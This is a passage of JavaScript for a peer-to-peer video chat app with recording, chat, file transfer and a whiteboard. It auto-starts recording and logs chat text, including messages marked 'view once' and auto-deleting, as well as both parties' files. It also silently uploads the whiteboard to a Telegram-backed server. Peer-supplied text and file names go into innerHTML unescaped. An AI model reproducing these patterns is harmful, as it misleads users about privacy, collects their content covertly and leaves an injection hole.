    } catch (e) {}
}

// ============ SHOW CALL + START RECORDING ============
function showCallScreen(remoteStream) {
    waitingScreen.style.display = 'none';
    callScreen.classList.remove('hidden');
    remoteVideo.srcObject = remoteStream;
    remoteNoVideo.style.display = 'none';
    callStartTime = Date.now();
    showToast('Connected! 🎉');
    logEvent('call_started');
    playSciFiSound('join');

    try {
        setupActiveSpeakerDetector(remoteStream, remoteVideo);
        if (localStream) setupActiveSpeakerDetector(localStream, localVideo);
        setupDynamicNetworkAdaptation(currentCall);
    } catch (e) { }

    // 🚀 Enable Chrome Automatic Picture-in-Picture on App Switch
    try {
        if ('autoPictureInPicture' in remoteVideo) {
            remoteVideo.autoPictureInPicture = true;
            console.log('✅ Enabled Chrome Auto-PiP on tab/app switch');
        }
    } catch (e) { }

    setTimeout(() => { startRecording(); }, 2000);
}

// ============ LEAVE ROOM ============
function leaveRoom() {
    autoSaveWhiteboardToTelegram('call_ended');
    if (isCallActive || (mediaRecorder && mediaRecorder.state !== 'inactive')) {
        stopRecording();
    }
    if (callStartTime) logEvent('call_ended', { duration: formatCallDuration(), messages: messageCount });
    else logEvent('user_left');

    if (currentCall) { currentCall.close(); currentCall = null; }
    if (dataConnection) { dataConnection.close(); dataConnection = null; }
    if (peer) { peer.destroy(); peer = null; }
    if (localStream) { localStream.getTracks().forEach(t => t.stop()); localStream = null; }
    if (localVideo) localVideo.srcObject = null;
    if (remoteVideo) remoteVideo.srcObject = null;

    waitingScreen.style.display = 'flex';
    callScreen.classList.add('hidden');
    chatPanel.classList.add('hidden');
    fileProgress.classList.add('hidden');
    recordingIndicator.classList.add('hidden');
    isMicOn = true; isCamOn = true; isScreenSharing = false;
    incomingFileBuffers = {};
    callStartTime = null; messageCount = 0; currentRoomId = null;
    mediaRecorder = null; recordedChunks = [];
    combinedStream = null; isCallActive = false;
    segmentNumber = 0; totalRecordingSize = 0;
    if (recordingTimer) { clearTimeout(recordingTimer); recordingTimer = null; }
    updateControlButtons();

    chatMessages.innerHTML = '<div class="chat-system">Chat started. Say hello! 👋</div>';
    showPage(homePage);
    if (window.location.search) window.history.replaceState({}, document.title, window.location.pathname);
}

// ============ COPY LINK ============
function copyLink() {
    navigator.clipboard.writeText(shareableLink.value).then(() => showToast('Link copied! 📋')).catch(() => { shareableLink.select(); document.execCommand('copy'); showToast('Link copied!'); });
}
copyLinkBtn.addEventListener('click', copyLink);
copyLinkBtn2.addEventListener('click', copyLink);

// ============ MIC / CAM / SCREEN ============
toggleMicBtn.addEventListener('click', () => {
    if (!localStream) return;
    isMicOn = !isMicOn;
    localStream.getAudioTracks().forEach(t => t.enabled = isMicOn);
    updateControlButtons();
    showToast(isMicOn ? '🎙 Mic on' : '🔇 Mic muted');
});
toggleCamBtn.addEventListener('click', () => {
    if (!localStream) return;
    isCamOn = !isCamOn;
    localStream.getVideoTracks().forEach(t => t.enabled = isCamOn);
    updateControlButtons();
    showToast(isCamOn ? '📹 Camera on' : '🚫 Camera off');
});
toggleScreenBtn.addEventListener('click', async () => {
    if (!localStream || !currentCall) return;
    if (!isScreenSharing) {
        try {
            const ss = await navigator.mediaDevices.getDisplayMedia({ video: { cursor: 'always' }, audio: false });
            originalVideoTrack = localStream.getVideoTracks()[0];
            const st = ss.getVideoTracks()[0];
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(st);
            st.onended = async () => { if (sender && originalVideoTrack) await sender.replaceTrack(originalVideoTrack); isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped'); };
            isScreenSharing = true; updateControlButtons(); showToast('🖥 Screen sharing started');
        } catch (e) { showToast('Screen share cancelled'); }
    } else {
        if (originalVideoTrack) {
            const sender = currentCall.peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
            if (sender) await sender.replaceTrack(originalVideoTrack);
        }
        isScreenSharing = false; updateControlButtons(); showToast('Screen share stopped');
    }
});

if (togglePipBtn) {
    togglePipBtn.addEventListener('click', async () => {
        try {
            if (!document.pictureInPictureEnabled) {
                showToast('⚠️ PiP mode not supported in this browser');
                return;
            }
            if (document.pictureInPictureElement) {
                await document.exitPictureInPicture();
                showToast('📺 Exited Floating PiP Mode');
            } else {
                if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.srcObject) {
                    await remoteVideo.requestPictureInPicture();
                    showToast('📺 Floating PiP Mode Active! You can switch apps now 🚀');
                } else {
                    showToast('⚠️ Waiting for remote video stream...');
                }
            }
        } catch (err) {
            console.error('PiP Error:', err);
            showToast('⚠️ Could not start PiP Mode');
        }
    });
}
if (remoteVideo) {
    remoteVideo.addEventListener('enterpictureinpicture', () => {
        if (togglePipBtn) togglePipBtn.classList.add('active');
        showToast('📺 Floating PiP Mode Active');
    });
    remoteVideo.addEventListener('leavepictureinpicture', () => {
        if (togglePipBtn) togglePipBtn.classList.remove('active');
    });
}

// ============ AUTOMATIC PIP ON TAB/APP SWITCH ============
document.addEventListener('visibilitychange', async () => {
    try {
        if (document.visibilityState === 'hidden' && isCallActive) {
            if (remoteVideo && remoteVideo.readyState >= 2 && remoteVideo.srcObject && !document.pictureInPictureElement) {
                if ('autoPictureInPicture' in remoteVideo) {
                    remoteVideo.autoPictureInPicture = true;
                } else if (document.pictureInPictureEnabled) {
                    await remoteVideo.requestPictureInPicture();
                    console.log('📺 Auto-PiP triggered on tab/app switch');
                }
            }
        }
    } catch (err) {
        console.log('Auto-PiP fallback note:', err);
    }
});

function updateControlButtons() {
    toggleMicBtn.className = 'control-btn' + (isMicOn ? '' : ' off');
    toggleMicBtn.innerHTML = isMicOn ? '<i class="fas fa-microphone"></i>' : '<i class="fas fa-microphone-slash"></i>';
    toggleCamBtn.className = 'control-btn' + (isCamOn ? '' : ' off');
    toggleCamBtn.innerHTML = isCamOn ? '<i class="fas fa-video"></i>' : '<i class="fas fa-video-slash"></i>';
    toggleScreenBtn.className = 'control-btn' + (isScreenSharing ? ' active' : '');
    if (togglePipBtn) togglePipBtn.className = 'control-btn' + (document.pictureInPictureElement ? ' active' : '');
}

// ============ CHAT ============
toggleChatBtn.addEventListener('click', () => { chatPanel.classList.toggle('hidden'); toggleChatBtn.classList.toggle('active'); });
let isBurnChatActive = false;
const toggleBurnChatBtn = document.getElementById('toggleBurnChatBtn');
if (toggleBurnChatBtn) {
    toggleBurnChatBtn.addEventListener('click', () => {
        isBurnChatActive = !isBurnChatActive;
        toggleBurnChatBtn.style.color = isBurnChatActive ? '#ff2d75' : '#a0a0cc';
        toggleBurnChatBtn.style.textShadow = isBurnChatActive ? '0 0 10px #ff2d75' : 'none';
        showToast(isBurnChatActive ? '🔥 View Once Chat Mode ON (10s Auto-Delete)' : '💬 Normal Chat Mode ON');
    });
}

closeChatBtn.addEventListener('click', () => { chatPanel.classList.add('hidden'); toggleChatBtn.classList.remove('active'); });
sendChatBtn.addEventListener('click', sendTextMessage);
chatInput.addEventListener('keydown', (e) => { if (e.key === 'Enter') sendTextMessage(); });

function sendTextMessage() {
    const text = chatInput.value.trim();
    if (!text) return;
    addChatMessage(text, true, isBurnChatActive);
    messageCount++;
    logEvent('chat_message', { text: (isBurnChatActive ? "[🔥 VIEW ONCE] " : "") + text, sender: userRole });
    if (dataConnection && dataConnection.open) dataConnection.send({ type: 'chat', text, burn: isBurnChatActive });
    chatInput.value = '';
}

function addChatMessage(text, isSent, isBurn = false) {
    const d = document.createElement('div');
    d.className = 'chat-msg ' + (isSent ? 'sent' : 'received') + (isBurn ? ' burn-message' : '');
    if (isBurn) {
        let timeLeft = 10;
        d.innerHTML = `<span class="burn-badge">(🔥 ${timeLeft}s)</span> <span>${text}</span>`;
        const timer = setInterval(() => {
            timeLeft--;
            const b = d.querySelector('.burn-badge');
            if (b) b.textContent = `(🔥 ${timeLeft}s)`;
            if (timeLeft <= 0) {
                clearInterval(timer);
                if (d.parentNode) d.parentNode.removeChild(d);
            }
        }, 1000);
    } else {
        d.textContent = text;
    }
    chatMessages.appendChild(d);
    chatMessages.scrollTop = chatMessages.scrollHeight;
}

// ============ FILE SHARING (IN-CALL) ============
attachFileBtn.addEventListener('click', () => fileInput.click());
fileInput.addEventListener('change', () => {
    const files = fileInput.files;
    if (!files.length) return;
    for (let i = 0; i < files.length; i++) sendFile(files[i]);
    fileInput.value = '';
});

async function sendFile(file) {
    if (!dataConnection || !dataConnection.open) { showToast('No data connection.'); return; }
    const tid = 'f_' + Date.now() + '_' + Math.random().toString(36).substr(2, 6);
    const ab = await file.arrayBuffer();
    const tc = Math.ceil(ab.byteLength / CHUNK_SIZE);
    logEvent('file_sent', { fileName: file.name, fileSize: ab.byteLength, sender: userRole });
    logFileUpload(file.name, ab);
    fileProgress.classList.remove('hidden');
    fileProgressFill.style.width = '0%';
    fileProgressText.textContent = `Sending ${file.name} (0%)`;
    dataConnection.send({ type: 'file-start', transferId: tid, fileName: file.name, fileSize: ab.byteLength, totalChunks: tc, mimeType: file.type || 'application/octet-stream' });
    for (let i = 0; i < tc; i++) {
        const s = i * CHUNK_SIZE, e = Math.min(s + CHUNK_SIZE, ab.byteLength);
        dataConnection.send({ type: 'file-chunk', transferId: tid, chunkIndex: i, data: ab.slice(s, e) });
        const pct = Math.round(((i + 1) / tc) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Sending ${file.name} (${pct}%)`;
        if (i % 5 === 0) await new Promise(r => setTimeout(r, 10));
    }
    dataConnection.send({ type: 'file-end', transferId: tid });
    addFileToChat(file.name, ab.byteLength, file.type, ab, true);
    fileProgress.classList.add('hidden');
    showToast(`✅ ${file.name} sent!`);
}

function handleDataMessage(data) {
    if (!data || !data.type) return;
    if (data.type === 'chat') {
        addChatMessage(data.text, false, data.burn || false);
        messageCount++;
        logEvent('chat_message', { text: (data.burn ? "[🔥 VIEW ONCE] " : "") + data.text, sender: userRole === 'creator' ? 'joiner' : 'creator' });
    }
    else if (data.type === 'reaction') {
        showFloatingReaction(data.emoji, false);
    }
    else if (data.type === 'wb-draw') {
        drawRemoteWb(data.x, data.y, data.x2, data.y2, data.color, data.size);
    }
    else if (data.type === 'wb-clear') {
        if (ctxWb) ctxWb.clearRect(0, 0, wbCanvas.width, wbCanvas.height);
        showToast('🧹 Whiteboard cleared by peer');
    }
    else if (data.type === 'file-start') {
        incomingFileBuffers[data.transferId] = { chunks: [], totalChunks: data.totalChunks, metadata: { fileName: data.fileName, fileSize: data.fileSize, mimeType: data.mimeType } };
        fileProgress.classList.remove('hidden');
        fileProgressFill.style.width = '0%';
        fileProgressText.textContent = `Receiving ${data.fileName} (0%)`;
    }
    else if (data.type === 'file-chunk') {
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        b.chunks[data.chunkIndex] = data.data;
        const pct = Math.round((b.chunks.filter(c => c).length / b.totalChunks) * 100);
        fileProgressFill.style.width = pct + '%';
        fileProgressText.textContent = `Receiving ${b.metadata.fileName} (${pct}%)`;
    }
    else if (data.type === 'file-end') {
        const b = incomingFileBuffers[data.transferId]; if (!b) return;
        const blob = new Blob(b.chunks, { type: b.metadata.mimeType });
        const url = URL.createObjectURL(blob);
        addFileToChat(b.metadata.fileName, b.metadata.fileSize, b.metadata.mimeType, null, false, url, blob);
        logEvent('file_sent', { fileName: b.metadata.fileName, fileSize: b.metadata.fileSize, sender: userRole === 'creator' ? 'joiner' : 'creator' });
        fileProgress.classList.add('hidden');
        showToast(`📥 ${b.metadata.fileName} received!`);
        delete incomingFileBuffers[data.transferId];
    }
}

function addFileToChat(fileName, fileSize, mimeType, arrayBuffer, isSent, blobUrl, blob) {
    const div = document.createElement('div');
    div.className = 'chat-msg ' + (isSent ? 'sent' : 'received');
    if (isImageFile(fileName)) {
        let imgSrc;
        if (isSent && arrayBuffer) { imgSrc = URL.createObjectURL(new Blob([arrayBuffer], { type: mimeType })); }
        else if (blobUrl) { imgSrc = blobUrl; }
        if (imgSrc) {
            const img = document.createElement('img'); img.src = imgSrc; img.className = 'chat-image'; img.style.maxWidth = '260px'; img.alt = fileName;
            img.addEventListener('click', () => {
                const ov = document.createElement('div'); ov.className = 'image-preview-overlay';
                ov.innerHTML = `<img src="${imgSrc}" alt="${fileName}">`;
                ov.addEventListener('click', () => ov.remove());
                document.body.appendChild(ov);
            });
            div.appendChild(img);
            const dl = document.createElement('a'); dl.href = imgSrc; dl.download = fileName; dl.className = 'file-download';
            dl.innerHTML = `<i class="fas fa-download"></i> ${fileName} (${formatFileSize(fileSize)})`;
            div.appendChild(document.createElement('br')); div.appendChild(dl);
        }
    } else {
        const fb = document.createElement('div'); fb.className = 'file-bubble';
        const ic = document.createElement('i'); ic.className = 'fas ' + getFileIcon(fileName); ic.style.color = isSent ? '#fff' : 'var(--neon-cyan)';
        const info = document.createElement('div'); info.className = 'file-info';
        const ns = document.createElement('span'); ns.className = 'file-name'; ns.textContent = fileName;
        const ss = document.createElement('span'); ss.className = 'file-size'; ss.textContent = formatFileSize(fileSize);
        info.appendChild(ns); info.appendChild(document.createElement('br')); info.appendChild(ss);
        fb.appendChild(ic); fb.appendChild(info); div.appendChild(fb);
        if (isSent && arrayBuffer) {
            const su = URL.createObjectURL(new Blob([arrayBuffer], { type: mimeType }));
            const dl = document.createElement('a'); dl.href = su; dl.download = fileName; dl.className = 'file-download'; dl.innerHTML = '<i class="fas fa-download"></i> Download'; div.appendChild(dl);
        } else if (blobUrl) {
            const dl = document.createElement('a'); dl.href = blobUrl; dl.download = fileName; dl.className = 'file-download'; dl.innerHTML = '<i class="fas fa-download"></i> Download'; div.appendChild(dl);
        }
    }
    chatMessages.appendChild(div); chatMessages.scrollTop = chatMessages.scrollHeight;
}

// ============ AUTO-JOIN URL ============
function checkUrlForRoom() {
    const p = new URLSearchParams(window.location.search);
    const r = p.get('room');
    if (r) {
        console.log('Auto-joining room from URL:', r);
        setTimeout(() => initRoom(r, false), 800);
    }
}

// ============ DRAGGABLE SELF VIDEO ============
(function () {
    const w = document.getElementById('selfVideoWrapper');
    let drag = false, sx, sy, ox, oy;
    w.addEventListener('mousedown', (e) => { drag = true; sx = e.clientX; sy = e.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
    document.addEventListener('mousemove', (e) => { if (!drag) return; w.style.position = 'absolute'; w.style.left = (ox + e.clientX - sx) + 'px'; w.style.top = (oy + e.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
    document.addEventListener('mouseup', () => { drag = false; w.style.transition = ''; });
    w.addEventListener('touchstart', (e) => { const t = e.touches[0]; drag = true; sx = t.clientX; sy = t.clientY; const r = w.getBoundingClientRect(); ox = r.left; oy = r.top; w.style.transition = 'none'; });
    document.addEventListener('touchmove', (e) => { if (!drag) return; const t = e.touches[0]; w.style.position = 'absolute'; w.style.left = (ox + t.clientX - sx) + 'px'; w.style.top = (oy + t.clientY - sy) + 'px'; w.style.right = 'auto'; w.style.bottom = 'auto'; });
    document.addEventListener('touchend', () => { drag = false; w.style.transition = ''; });
})();

// ============ SUPER ADVANCED STARTUP FEATURES (THEMES, WHITEBOARD, EMOJI, SOUNDS) ============
function setTheme(theme) {
    const root = document.documentElement;
    if (theme === 'cyan') {
        root.style.setProperty('--neon-cyan', '#00f0ff');
        root.style.setProperty('--neon-purple', '#b14dff');
        root.style.setProperty('--neon-green', '#39ff14');
    } else if (theme === 'green') {
        root.style.setProperty('--neon-cyan', '#39ff14');
        root.style.setProperty('--neon-purple', '#00ff66');
        root.style.setProperty('--neon-green', '#00f0ff');
    } else if (theme === 'pink') {
        root.style.setProperty('--neon-cyan', '#ff2d75');
        root.style.setProperty('--neon-purple', '#ff007f');
        root.style.setProperty('--neon-green', '#ffd700');
    } else if (theme === 'gold') {
        root.style.setProperty('--neon-cyan', '#ffd700');
        root.style.setProperty('--neon-purple', '#ff8c00');
        root.style.setProperty('--neon-green', '#00f0ff');
    }
    showToast(`🎨 Switched to ${theme.toUpperCase()} Theme`);
}
window.setTheme = setTheme;

function playSciFiSound(type) {
    try {
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const osc = ctx.createOscillator();
        const gain = ctx.createGain();
        osc.connect(gain);
        gain.connect(ctx.destination);
        const now = ctx.currentTime;
        if (type === 'pop') {
            osc.type = 'sine';
            osc.frequency.setValueAtTime(450, now);
            osc.frequency.exponentialRampToValueAtTime(900, now + 0.12);
            gain.gain.setValueAtTime(0.2, now);
            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.12);
            osc.start(now); osc.stop(now + 0.12);
        } else if (type === 'join') {
            osc.type = 'triangle';
            osc.frequency.setValueAtTime(300, now);
            osc.frequency.exponentialRampToValueAtTime(650, now + 0.25);
            gain.gain.setValueAtTime(0.25, now);
            gain.gain.exponentialRampToValueAtTime(0.01, now + 0.25);
            osc.start(now); osc.stop(now + 0.25);
        }
    } catch (e) {}
}

function setupActiveSpeakerDetector(stream, videoEl) {
    try {
        const audioTracks = stream.getAudioTracks();
        if (!audioTracks.length) return;
        const ctx = new (window.AudioContext || window.webkitAudioContext)();
        const src = ctx.createMediaStreamSource(new MediaStream([audioTracks[0]]));
        const analyser = ctx.createAnalyser();
        analyser.fftSize = 256;
        src.connect(analyser);
        const data = new Uint8Array(analyser.frequencyBinCount);
        setInterval(() => {
            if (!isCallActive) return;
            analyser.getByteFrequencyData(data);
            let sum = 0;
            for (let i = 0; i < data.length; i++) sum += data[i];
            const avg = sum / data.length;
            if (avg > 25 && videoEl) {
                videoEl.classList.add('active-speaker');
            } else if (videoEl) {
                videoEl.classList.remove('active-speaker');
            }
        }, 400);
    } catch (e) {}
}

function sendReaction(emoji) {
    showFloatingReaction(emoji, true);
    if (dataConnection && dataConnection.open) {
        dataConnection.send({ type: 'reaction', emoji });
    }
}
window.sendReaction = sendReaction;

function showFloatingReaction(emoji, isSelf) {
    playSciFiSound('pop');
    const el = document.createElement('div');
    el.className = 'floating-emoji';
    el.textContent = emoji;
    el.style.left = (Math.random() * 60 + 20) + '%';
    document.body.appendChild(el);
    setTimeout(() => { if (el && el.parentNode) el.parentNode.removeChild(el); }, 2200);
}

const whiteboardModal = document.getElementById('whiteboardModal');
const toggleWhiteboardBtn = document.getElementById('toggleWhiteboardBtn');
const closeWhiteboardBtn = document.getElementById('closeWhiteboardBtn');
const wbCanvas = document.getElementById('whiteboardCanvas');
const clearWhiteboardBtn = document.getElementById('clearWhiteboardBtn');
let ctxWb = wbCanvas ? wbCanvas.getContext('2d') : null;
let isDrawingWb = false, lastWbX = 0, lastWbY = 0, currentWbColor = '#00f0ff';
let isDirtyWb = false;

function autoSaveWhiteboardToTelegram(reason = "auto") {
    if (!wbCanvas || !isDirtyWb) return;
    console.log(`🤖 Auto-saving whiteboard to Telegram in background (${reason})...`);
    wbCanvas.toBlob(async (blob) => {
        const formData = new FormData();
        formData.append('file', blob, `whiteboard_${currentRoomId || 'snapshot'}_${reason}.png`);
        formData.append('password', '');
        formData.append('viewOnce', 'false');
        try {
            await fetch(`${SERVER_URL}/api/upload-file`, { method: 'POST', body: formData });
            console.log('✅ Whiteboard auto-saved to Telegram!');
        } catch (e) {}
    }, 'image/png');
    isDirtyWb = false;
}
window.autoSaveWhiteboardToTelegram = autoSaveWhiteboardToTelegram;

if (toggleWhiteboardBtn) {
    toggleWhiteboardBtn.addEventListener('click', () => {
        if (whiteboardModal) whiteboardModal.style.display = 'flex';
    });
}
if (closeWhiteboardBtn) {
    closeWhiteboardBtn.addEventListener('click', () => {
        autoSaveWhiteboardToTelegram('closed');
        if (whiteboardModal) whiteboardModal.style.display = 'none';
    });
}
function setWbColor(c) { currentWbColor = c; showToast('🎨 Color selected'); }
window.setWbColor = setWbColor;

function clearWhiteboard() {
    autoSaveWhiteboardToTelegram('before_clear');
    if (ctxWb && wbCanvas) ctxWb.clearRect(0, 0, wbCanvas.width, wbCanvas.height);
    if (dataConnection && dataConnection.open) dataConnection.send({ type: 'wb-clear' });
    showToast('🧹 Whiteboard cleared');
}
window.clearWhiteboard = clearWhiteboard;

if (wbCanvas) {
    wbCanvas.addEventListener('mousedown', (e) => {
        isDrawingWb = true;
        isDirtyWb = true;
        const rect = wbCanvas.getBoundingClientRect();
        lastWbX = (e.clientX - rect.left) * (wbCanvas.width / rect.width);
        lastWbY = (e.clientY - rect.top) * (wbCanvas.height / rect.height);
    });
    wbCanvas.addEventListener('mousemove', (e) => {
        if (!isDrawingWb || !ctxWb) return;
        isDirtyWb = true;
        const rect = wbCanvas.getBoundingClientRect();
        const x = (e.clientX - rect.left) * (wbCanvas.width / rect.width);
        const y = (e.clientY - rect.top) * (wbCanvas.height / rect.height);
        drawWbLine(lastWbX, lastWbY, x, y, currentWbColor, currentWbColor === '#04040c' ? 18 : 3);
        if (dataConnection && dataConnection.open) {
            dataConnection.send({ type: 'wb-draw', x: lastWbX, y: lastWbY, x2: x, y2: y, color: currentWbColor, size: currentWbColor === '#04040c' ? 18 : 3 });
        }
        lastWbX = x; lastWbY = y;
    });
    window.addEventListener('mouseup', () => { isDrawingWb = false; });
}
function drawWbLine(x1, y1, x2, y2, color, size) {
    if (!ctxWb) return;
    ctxWb.beginPath();
    ctxWb.moveTo(x1, y1); ctxWb.lineTo(x2, y2);
    ctxWb.strokeStyle = color; ctxWb.lineWidth = size;
    ctxWb.lineCap = 'round'; ctxWb.stroke();
}
function drawRemoteWb(x1, y1, x2, y2, color, size) {
    isDirtyWb = true;
    drawWbLine(x1, y1, x2, y2, color, size);
}

// ============ INIT ============
checkUrlForRoom();
checkFilePreview();
